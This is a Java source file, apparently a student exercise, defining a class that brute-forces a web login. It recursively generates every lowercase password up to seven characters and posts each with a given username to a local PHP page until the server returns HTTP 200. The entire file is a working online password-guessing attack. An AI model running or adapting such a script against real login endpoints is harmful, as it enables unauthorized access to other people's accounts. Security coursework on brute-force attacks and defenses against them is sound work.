
import java.net.http.HttpResponse;
import java.util.HashMap;
import java.util.Map;


public class SecEyeXBruteForce extends SecEyeX {
    
    public String attaque(String username) throws Exception {
        System.out.println("En cours de craquage par bruteforce...");

        String returnedPassword = new String();
        long debut = System.currentTimeMillis();

        for (int i = 1; i < 8; i++) {
            
            char[] passwordToGenerate = new char[i];
            returnedPassword = forceBrute(username, passwordToGenerate, 0);
           
            if(returnedPassword != null)
                break;
            
        }

        long fin = System.currentTimeMillis();
        long tempsEcoule = (fin - debut)/1000;
        System.out.println("temps ecoule : "+tempsEcoule+"s");

        return returnedPassword;

    }

    
   
    public String forceBrute(String username, char[] password, int position) throws Exception{
        int longueur = password.length;
        if(position == longueur-1){
            for (char i = 'a'; i <= 'z'; i++) {
                password[position] = i;
                String generatedPasswordString = new String(password);
                System.out.println(generatedPasswordString);

                Map<String, String> params = new HashMap<>();
                params.put("username", username);
                params.put("password", generatedPasswordString);

                String url = "http://localhost/design_pattern/index.php";
                HttpResponse<String> reponse; 
                reponse = SecEyeXControle.mdHttp(url, params);

                int statusCode = reponse.statusCode();
                if(statusCode == 200){
                    String responseBody = reponse.body();

                    System.out.println("Code de statut : " + statusCode);
                    System.out.println("Corps de la réponse : " + responseBody);
                    return generatedPasswordString;
                }


            }
            return null;

        }else{
            for (char i = 'a'; i <= 'z'; i++) {
                password[position] = i;
                if(forceBrute(username, password, position +1) != null){
                    return new String(password);
                }
            }

            return null;
        }


        
    }


}